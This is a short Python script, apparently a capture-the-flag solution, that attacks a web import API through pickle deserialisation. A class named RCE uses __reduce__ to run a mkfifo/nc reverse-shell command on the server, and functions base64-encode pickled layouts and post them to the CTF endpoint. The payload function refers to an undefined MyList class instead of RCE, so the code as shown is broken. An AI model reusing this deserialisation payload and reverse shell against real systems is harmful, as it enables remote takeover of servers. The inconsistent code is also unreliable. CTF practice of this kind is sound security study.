import pickle
import requests
import base64
import os


def normal_usage(debug=True):
    '''
    this gets accepted by the import api
    '''
    print('normal layout:\n')
    url = 'http://ctf.adl.tw:12004/api/import'
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}
        
    ]
    print("typeof mylayout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return
    myobj={'layout':my_layout}

    r = requests.post(url, json = myobj)
    
    return


class RCE:
    def __reduce__(self):

        cmd='mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 127.0.0.1 8081 >/tmp/f'
       
        return os.system, (cmd,)
        

def payload(debug=True):
    
    print('payload layout:\n')
    url = 'http://ctf.adl.tw:12004/api/import'

    my_layout:list[dict] =MyList()


    print("typeof mylayout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return



    myobj={'layout':my_layout}
    r = requests.post(url, json = myobj)
    return


normal_usage()
payload()

